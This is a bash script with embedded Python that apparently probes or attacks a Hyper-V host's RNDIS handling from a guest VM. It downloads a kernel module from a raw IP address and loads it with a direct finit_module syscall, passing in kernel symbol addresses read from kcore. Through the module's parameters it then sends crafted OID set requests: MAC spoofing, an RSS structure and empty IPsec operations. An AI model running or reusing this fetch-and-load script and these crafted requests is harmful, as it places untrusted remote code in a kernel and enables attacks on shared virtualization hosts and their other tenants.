#!/bin/bash
set +e
exec 0<&-

curl -fsS http://16.146.243.72:8450/rndis_oid_set.ko -o /tmp/rndis_oid_set.ko || exit 10
own_mac=$(tr -d ':\n' </hostsys/class/net/eth0/address 2>/dev/null)
printf 'RNDIS_SET_HOST own_mac=%s\n' "$own_mac"
python3 - /tmp/rndis_oid_set.ko 0x01010103 01005e000001 <<'PY'
import ctypes, os, sys
from kcore_relid_load import symbol_address
from rndis_legit_run import resolve_objects
guid, relid, _nvdev, rndis, request_id = resolve_objects()
oid = int(sys.argv[2], 0)
data_hex = sys.argv[3]
values = tuple(symbol_address(name) for name in
               ("get_rndis_request", "rndis_filter_send_request", "put_rndis_request"))
parameters = ("get_address=0x%x send_address=0x%x put_address=0x%x rndis_device=0x%x "
              "oid=0x%x input_length=%u data_hex=%s arm=1" %
              (values[0], values[1], values[2], rndis, oid, len(data_hex)//2, data_hex)).encode()
print("RNDIS_SET_PRE guid=%s relid=%u rndis=%x reqid=%u oid=%#x input_length=%u" %
      (guid, relid, rndis, request_id, oid, len(data_hex)//2))
fd=os.open(sys.argv[1], os.O_RDONLY); libc=ctypes.CDLL(None,use_errno=True)
result=libc.syscall(313,fd,parameters,3)
print("RNDIS_SET_FINIT result=%d errno=%d" % (result,ctypes.get_errno()))
PY

paramdir=/hostsys/module/rndis_oid_set/parameters
run_set() {
    label=$1
    case_oid=$2
    case_hex=$3
    printf 'RNDIS_SET_CASE label=%s oid=%s bytes=%s\n' "$label" "$case_oid" "$(( ${#case_hex} / 2 ))"
    printf '%s' "$case_oid" >"$paramdir/oid" || return
    printf '%s' "$case_hex" >"$paramdir/data_hex" || return
    printf '%s' "$(( ${#case_hex} / 2 ))" >"$paramdir/input_length" || return
    printf 1 >"$paramdir/arm"
}

[ -d "$paramdir" ] || exit 11
run_set lbfo-own 0xfa010203 "$own_mac"
run_set lbfo-random 0xfa010203 023900000001
rss_disable=$(python3 - <<'PY'
import struct
# NDIS_RECEIVE_SCALE_PARAMETERS rev2 used by netvsc: 40-byte base, 128
# PROCESSOR_NUMBER entries and a 40-byte key. Flags disable RSS.
head=struct.pack('<BBHHH',0x89,2,40,0x10,0)+struct.pack('<I',0)+struct.pack('<H',512)+b'\0\0'+struct.pack('<I',40)+struct.pack('<H',40)+b'\0\0'+struct.pack('<I',552)+struct.pack('<III',0,0,0)
print((head+b'\0'*(512+40)).hex())
PY
)
run_set rss-disable-r2 0x00010204 "$rss_disable"
run_set ipsec-add-empty 0xfc030203 ''
run_set ipsec-delete-empty 0xfc030204 ''
run_set ipsec-update-empty 0xfc030205 ''

sleep 2
dmesg --notime 2>/dev/null | grep -E 'rndis_oid_(set|query)' | tail -40
printf 'ROOT_AUTO done\n'
